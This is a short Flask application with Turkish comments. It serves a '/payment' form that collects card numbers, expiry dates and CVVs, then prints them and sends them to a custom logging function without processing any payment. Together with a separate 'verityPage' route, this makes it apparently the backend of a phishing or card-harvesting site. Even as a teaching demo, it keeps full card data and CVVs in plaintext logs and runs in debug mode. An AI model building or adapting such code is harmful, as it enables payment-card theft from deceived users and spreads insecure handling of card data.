from flask import Flask, request, render_template
import os
import src.log

PEOPLE_FOLDER = os.path.join('static')
app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = PEOPLE_FOLDER

@app.route("/")
def mainPages():
    full_filename = os.path.join(app.config['UPLOAD_FOLDER'], 'logo.png')
    return render_template("mainPage.html", logos = full_filename)

# Ödeme sayfası için GET ve POST isteklerini kabul eden route
@app.route('/payment', methods=['GET', 'POST'])
def payment():
    full_filename = os.path.join(app.config['UPLOAD_FOLDER'], 'logo.png')
    if request.method == 'POST':
        card_number = request.form.get('cardNumber')
        expiry_date = request.form.get('expiryDate')
        cvv = request.form.get("cvv")

        print(f"Kredi Kartı Numarası: {card_number}")
        print(f"Son Kullanma Tarihi: {expiry_date}")
        print(f"CVV: {cvv}")

        # Log işlemi
        src.log.logs(cardNumber=card_number, expiryDate=expiry_date, cvv=cvv)

        
        return render_template("payment.html", logo_png=full_filename)
    
    # GET isteği için ödeme formunu göster
    return render_template("payment.html", logo_png = full_filename)


@app.route("/vp", methods=['GET'])
def vertypages():
    full_filename = os.path.join(app.config['UPLOAD_FOLDER'], 'logo.png')
    return render_template("verityPage.html", logo2_png=full_filename)

if __name__ == '__main__':
    app.run(debug=True)
